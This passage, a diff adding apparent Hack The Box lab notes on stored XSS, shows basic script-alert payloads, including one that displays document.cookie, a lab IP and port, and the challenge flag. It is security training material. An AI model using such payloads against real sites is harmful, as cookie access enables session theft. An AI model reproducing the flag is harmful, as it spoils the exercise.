@@ -1,1 +1,20 @@
 
+** The first and most critical type of XSS vulnerability is Stored XSS or Persistent XSS. If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page. **
+
+!! We can test whether the page is vulnerable to XSS with the following basic XSS payload: !! 
+
+EXAMPLE: <script>alert(window.origin)</script>
+
+We can confirm this further by looking at the page source by clicking [CTRL+U] or right-clicking and selecting View Page Source, and we should see our payload in the page source:
+
+HTML will look like -> <div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
+</ul></ul> 
+
+CHALLENGE: 94.237.49.98:33323
+
+
+QUESTION 1 - To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url. - HTB{570r3d_f0r_3v3ry0n3_70_533}
+1) http://94.237.49.98:33323
+2) <script>alert(document.cookie)</script>
+3) output: cookie=HTB{570r3d_f0r_3v3ry0n3_70_533}
+<script>alert(document.cookie)</script>
